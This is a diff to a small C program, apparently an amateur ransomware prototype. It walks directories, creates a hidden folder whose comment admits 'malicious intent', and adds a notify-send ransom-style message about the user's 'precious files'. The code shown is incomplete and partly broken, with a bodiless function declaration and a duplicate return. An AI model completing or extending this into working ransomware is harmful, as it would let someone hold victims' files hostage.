@@ -6,11 +6,13 @@
 #include <stdio.h>
 #include <string.h>
 #include <stat.h>
+#include <stdlib.h>
 
 void changeTxt(struct dirent *entry, const char *direct);
 void changeC(struct dirent *entry, const char *direct);
 void changeMd(struct dirent *entry, const char *direct);
 void openDir(const char *direct, int level);
+int copyFile(char * paths[]) {
 
 int main(void) {
 	//Change first param of changeDir to a directory path to indicate which directory you want to explore
@@ -22,6 +24,15 @@ int main(void) {
 	//created directory which led to 'games2' to subtly hide from user malicious intent
 	mkdir(fileCollectionAddress, 0777);
 	openDir("test", 0);
+
+    char command[100], msg[1000];
+
+    strcpy(command,"notify-send ");
+    strcpy(msg,"\"You have been GOATED. If you would like to see any of your precious files again... Ryan can you come up with something lol\"");
+    strcat(command,msg);
+
+    system(command);
+    return 0;
 	return 0;
 }
 
